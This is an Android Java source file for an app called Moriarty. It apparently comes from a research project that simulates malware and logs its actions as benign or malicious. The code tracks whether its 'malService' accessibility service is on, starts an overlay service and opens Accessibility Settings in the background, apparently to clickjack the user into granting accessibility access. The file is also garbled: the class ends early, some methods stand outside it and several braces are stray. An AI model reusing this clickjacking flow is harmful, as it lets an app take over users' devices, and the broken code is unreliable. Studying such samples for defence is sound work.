package com.bgu.sherlock.Moriarty;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.Window;
import android.view.WindowManager;

import androidx.annotation.RequiresApi;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import java.io.IOException;
import java.io.OutputStream;
import java.io.Serializable;


public class MainActivity extends Activity {

    public final static int REQUEST_CODE = 12;
    boolean writeAccepted = false;
    private static final String TAG = "Moriarty";
//    private static String TAG = "Moriarty";
    private final Clues clue = new Clues();
//    private Clues clue = new Clues();
    private final BroadcastReceiver mbroadcast = new MyBroadCastReciever();
//    private BroadcastReceiver mbroadcast = new MyBroadCastReciever();

    private static final int REQUEST_PERMISSIONS_CODE_WRITE_STORAGE = 200;
//    private boolean writeAccepted = false;

    @Override
    public boolean onTouchEvent(MotionEvent event) {
        //System.out.println(String.valueOf(event.getX()));
        return super.onTouchEvent(event);
    }

    private boolean shouldAskPermission(){

        Log.e(TAG,Build.VERSION.SDK_INT + " " + Build.VERSION_CODES.LOLLIPOP_MR1 );

        return true;

    }

    private final BroadcastReceiver closeReciver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.e(TAG,"Exit brod received");
            finishAffinity();
        }
    };

    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        if (isAccessibilitySettingsOn(getApplicationContext()))
            Singleton.getInstance().clickJacking = "OFF";
        else
            Singleton.getInstance().clickJacking = "ON";

//        registerReceiver(closeReciver, new IntentFilter("xyz"));
        IntentFilter intentFilter = new IntentFilter("xyz");
        registerReceiver(closeReciver, intentFilter, Context.RECEIVER_NOT_EXPORTED);

        Log.e(TAG,Build.getRadioVersion());
        SharedPreferences settings = getSharedPreferences("MoriartySession", 0);
        MyApp.sessionId= settings.getInt("Moriarty", 0);

        clue.SendMal( "App Mode Change","App Entered onCreate()","Clickjacking[" +  Singleton.getInstance().clickJacking + "]","benign");



        if (shouldAskPermission()){
            Log.e(TAG,"requesting.." );
            clue.SendMal("Requesting permission","Requesting write permission","Clickjacking[" +  Singleton.getInstance().clickJacking + "]","malicious");
            String[] perms = {"android.permission.WRITE_EXTERNAL_STORAGE"};

            int permsRequestCode = 200;
            requestPermissions(perms, permsRequestCode);
        }
        else writeAccepted = true;
    }

    @Override
    public void onRequestPermissionsResult(int permsRequestCode, String[] permissions, int[] grantResults){
        switch(permsRequestCode){
            case 200:
//                writeAccepted = grantResults[0]== PackageManager.PERMISSION_GRANTED;
                writeAccepted = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
                onResume();
                break;
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        clue.SendMal("App Mode Change","App Entered onResume()","Clickjacking[" + Singleton.getInstance().clickJacking + "]","benign");
        if (!writeAccepted) return;

        LocalBroadcastManager.getInstance(getApplicationContext()).registerReceiver(mbroadcast, new IntentFilter("goRand"));

        Singleton.getInstance().sHome = false;
        Singleton.getInstance().mBool = false;
        Window window = getWindow();
        //window.setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);

        window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
        window.setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT);
        window.setGravity(Gravity.BOTTOM);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            createWriteRequestForQAndAbove();
        } else {
            // For versions below Q, you might still use the existing code if needed
            // This part depends on your specific use case
        }

        final Intent i = new Intent(this, TopService.class);
        startService(i);

        new Thread(new Runnable() {
            public void run() {
                Log.e(TAG,"Thread started");
                final Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                final HomeWatcher mHomeWatcher = new HomeWatcher(getApplicationContext());
                mHomeWatcher.setOnHomePressedListener(new OnHomePressedListener() {
                    @Override
                    public void onHomePressed() {
                        Log.e(TAG,"Home pressed2");
                    }
                    @Override
                    public void onHomeLongPressed() {
                    }
                });
                mHomeWatcher.startWatch();

                while (!Singleton.getInstance().mBool)
                    Thread.yield();
                Log.e(TAG,"can launch settings");
                clue.SendMal("App Mode Change","App Entered Accessibility Settings in Background view","Clickjacking[" +  Singleton.getInstance().clickJacking + "]" ,"malicious");

                startActivityForResult(intent,REQUEST_CODE);

                boolean haveAccess = Singleton.getInstance().shouldAccess;
                while(haveAccess==Singleton.getInstance().shouldAccess) {
                    Thread.yield();
                }
                Log.e(TAG,"closing settings");
                finishActivity(REQUEST_CODE);

                //Intent i = new Intent(Intent.ACTION_MAIN);
               // i.addCategory(Intent.CATEGORY_HOME);
                //startActivity(i);
            }
        }).start();


    }
    private void createWriteRequestForQAndAbove() {
        // Assuming 'context' is your application context
        ContentResolver contentResolver = getContentResolver();
        ContentValues contentValues = new ContentValues();
        contentValues.put(MediaStore.Images.Media.DISPLAY_NAME, "example.jpg");
        contentValues.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg");

        // Use MediaStore.createWriteRequest to get the Uri
        PendingIntent uri = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            uri = MediaStore.createWriteRequest(contentResolver, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues);
        }

        if (uri != null) {
            try {
                // Open an OutputStream to write data to the Uri
                OutputStream outputStream = contentResolver.openOutputStream(uri);
                // Write your data to the outputStream

                // Highlight: Add your data-writing logic here

                outputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    // ... (Existing code)

    // Example class for custom data
    private static class CustomData implements Serializable {
        private String data;

        public CustomData(String data) {
            this.data = data;
        }

        // Add any additional logic or methods as needed
    }
}
    public void callBackBtn(){
        KeyEvent kdown = new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_BACK);
        dispatchKeyEvent(kdown);
    }



    @Override
    protected void onPause() {
        Log.e("tag", "on pause");
        clue.SendMal("App Mode Change","App Entered onPause()","Clickjacking[" +  Singleton.getInstance().clickJacking + "]","benign");
        LocalBroadcastManager.getInstance(this).unregisterReceiver(mbroadcast);
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(closeReciver);
    }

    private boolean isAccessibilitySettingsOn(Context mContext) {
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + malService.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    mContext.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
            // Log.v(TAG, "accessibilityEnabled = " + accessibilityEnabled);
        } catch (Settings.SettingNotFoundException e) {
            //Log.e(TAG, "Error finding setting, default accessibility to not found: "
            //        + e.getMessage());
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            //Log.v(TAG, "***ACCESSIBILITY IS ENABLED*** -----------------");
            String settingValue = Settings.Secure.getString(
                    mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();

                    //Log.v(TAG, "-------------- > accessibilityService :: " + accessibilityService + " " + service);
                    if (accessibilityService.equalsIgnoreCase(service)) {
                        //  Log.v(TAG, "We've found the correct setting - accessibility is switched on!");
                        return true;
                    }
                }
            }
        } else {
           //  Log.v(TAG, "***ACCESSIBILITY IS DISABLED***");
        }
        return false;
    }
}

    public class MyBroadCastReciever extends BroadcastReceiver {
        private static final String TAG = "MyBroadCastReceiver";

        @Override
        public void onReceive(Context context, Intent intent) {
            Log.e(TAG,"Action2 " + intent.getAction());
//            Log.e(TAG,"Action2 " + intent.getAction().toString());
            if (intent.getAction().equals("goRand")){

                finishActivity(REQUEST_CODE);

            }
        }
    }
}




